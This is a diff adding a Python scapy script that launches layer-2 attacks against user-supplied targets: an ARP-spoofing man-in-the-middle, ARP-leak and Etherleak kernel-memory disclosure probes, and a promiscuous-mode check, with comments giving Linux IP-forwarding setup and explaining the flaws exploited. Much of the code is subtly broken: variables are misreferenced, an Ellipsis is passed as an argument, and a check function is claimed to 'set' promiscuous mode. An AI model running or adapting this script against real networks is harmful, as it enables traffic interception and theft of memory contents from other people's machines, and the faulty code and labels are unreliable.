@@ -1,0 +1,71 @@
+#! /usr/bin/python
+from scapy.layers.l2 import Ether, ARP
+import scapy.all as scapy
+import time
+
+
+def attack(T1ip, T2ip, T1MAC, T2MAC, Attacker, iface):
+    # mac1 and mac2 are optional, will arp if not provided, broadcast makes broadcast default, target_mac is your MAC address: defaults to your interfaces one, iface is for the name of the network interface, defaults to route for ip1
+    scapy.layers.l2.arp_mitm(T1, T2, T1MAC, T2MAC, False, Attacker, iface)
+    # scapy.layers.l2.arp_mitm("0.0.0.0", "0.0.0.0", "ff:ff:ff:ff:ff:ff", "ff:ff:ff:ff:ff:ff", False, "ff:ff:ff:ff:ff:ff", "Ethernet2")
+    # scapy.layers.l2.arp_mitm(ip1, ip2, mac1, mac2 ,Broadcast, target_mac, iface)
+    return "Attack Sent"
+
+
+# linux implementation:
+# $ sysctl net.ipv4.conf.virbr0.send_redirects=0  # virbr0 = interface | default Send_redirects =1, virbr0: for Network Address resolution
+# $ sysctl net.ipv4.ip_forward=1 | default = 0
+# $ sudo scapy
+# >>> arp_mitm("192.168.122.156", "192.168.122.17")
+
+def ARP_Leak_Attack(VIP):
+    scapy.layers.l2.arpleak(VIP, 255, 255, ...)  # Values must be 255 for it to work
+    print("ARP_Leak_Attack sent to " + VIP)
+
+# scapy.layers.l2.arpleak(target: str, plen, hwlen, **kargs) Returns: Tuple[SndRcvList, PacketList]
+# When replying to an ARP request, a particular branch taken in the
+# output code did not free the mbuf that was being sent. An attacker
+# could send specially:crafted ARP requests that trigger this memory
+# leak.
+# When processing a received ARP request, the system did not properly
+#  check the hardware and protocol lengths in the ARP header. These fields
+#  being used to reply to the request in memcpys, an attacker could send
+#  an ARP packet with the highest encodable lengths and cause the kernel
+#  to copy in the reply packet more data than is available. It has been
+#  demonstrated that a remote machine can thereby retrieve 249 bytes of
+#  kernel memory over an Ethernet link.
+def Ethernet_Leak_Attack(VIP):
+    scapy.layers.l2.etherleak(VIP, ...)
+    print("Ethernet_Leak_Attack sent to " + VIP)
+    # scapy.layers.l2.etherleak(target: str, **kargs) Returns: Tuple[SndRcvList, PacketList]
+
+
+# Etherleak is an information disclosure vulnerability that allows an attacker to view slices of previously
+# transmitted packets or portions of kernel memory This vulnerability arises when bytes used to pad an Ethernet frame
+# to the minimum size are copied directly from a dirty buffer without being sanitized It is a link layer
+# implementation flaw in multiple platforms. Ethernet connection leakage current should be negligible with UTP,
+# but if shielded cable is used, there will also be made a chassis connection between the two devices. Cable signal
+# leaks occur when the RF signals transmitted within a cable system are not properly contained.
+
+def promisc_mode(uip):
+    # Promiscuous mode is a feature in computer networking that allows a network interface controller (NIC) or wireless network interface controller (WNIC) to capture all network traffic it receives,
+    # rather than filtering and processing only the frames specifically addressed to it
+    scapy.layers.l2.is_promisc(uip, 'ff:ff:00:00:00:00')
+    return "Promisc Mode set"
+    # scapy.layers.l2.is_promisc(ip: str, fake_bcast: str = 'ff:ff:00:00:00:00', **kargs: Any)→ bool
+if __name__ == '__main__':
+    T1 = input("Enter Target1's IP Address")
+    T2 = input("Enter Target2's IP Address")
+    Attacker = input("What is your own MAC address (ff:ff:ff:ff:ff:ff)")
+    uip = input("What is your IP Address?")
+    iface = input("Enter the name of your Network Interface");
+    Mac1 = scapy.layers.l2.getmacbyip(T1, 0)
+    Mac2 = scapy.layers.l2.getmacbyip(T2, 0)
+    print(attack(T1, T2, Mac1, Mac2, Attacker, iface))
+    print(promisc_mode(uip))
+    print(ARP_Leak_Attack(T1))
+    print(ARP_Leak_Attack(T2))
+    print(Ethernet_Leak_Attack(T1))
+    print(Ethernet_Leak_Attack(T2))
+    # scapy.layers.l2.getmacbyip("0.0.0.0", 0)
+    # scapy.layers.l2.getmacbyip(ip, chainCC) returns: str | None
